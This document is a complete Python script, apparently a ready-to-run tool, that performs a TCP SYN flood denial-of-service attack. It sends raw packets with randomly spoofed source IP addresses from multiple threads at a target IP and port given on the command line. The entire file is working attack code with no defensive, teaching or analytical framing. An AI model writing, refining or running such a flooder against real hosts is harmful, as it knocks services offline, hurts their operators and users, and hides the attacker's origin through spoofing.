import sys
import socket
import random
import threading
import time
import struct
from datetime import datetime, timedelta

class TCP_SYN_Flood:
    def __init__(self, target_ip, target_port, duration, threads):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.stop_attack = False

    def generate_random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def syn_flood(self):
        while not self.stop_attack:
            try:
                spoofed_ip = self.generate_random_ip()
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # TCP Header
                tcp_header = struct.pack(
                    '!HHLLBBHHH',
                    random.randint(1024, 65535),  # Source Port
                    self.target_port,            # Dest Port
                    random.randint(0, 4294967295),  # Seq Num
                    0,                           # Ack Num
                    (5 << 4),                    # Data Offset
                    0x02,                        # SYN Flag
                    5840,                        # Window
                    0,                           # Checksum
                    0                            # Urgent Pointer
                )
                
                # IP Header (Spoofed)
                ip_header = struct.pack(
                    '!BBHHHBBH4s4s',
                    69,                          # Version/IHL
                    0,                           # ToS
                    40,                          # Total Length
                    random.randint(1, 65535),     # ID
                    0,                           # Frag Offset
                    255,                         # TTL
                    socket.IPPROTO_TCP,           # Protocol
                    0,                           # Checksum
                    socket.inet_aton(spoofed_ip), # Source IP
                    socket.inet_aton(self.target_ip) # Dest IP
                )
                
                s.sendto(ip_header + tcp_header, (self.target_ip, 0))
                s.close()
            except:
                pass

    def start(self):
        end_time = datetime.now() + timedelta(seconds=self.duration)
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.syn_flood)
            t.daemon = True
            threads.append(t)
            t.start()
        
        while datetime.now() < end_time:
            time.sleep(0.1)
        
        self.stop_attack = True
        for t in threads:
            t.join()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python tcp_flood.py <IP> <PORT> <DURATION> <THREADS>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])
    
    attack = TCP_SYN_Flood(target_ip, target_port, duration, threads)
    attack.start()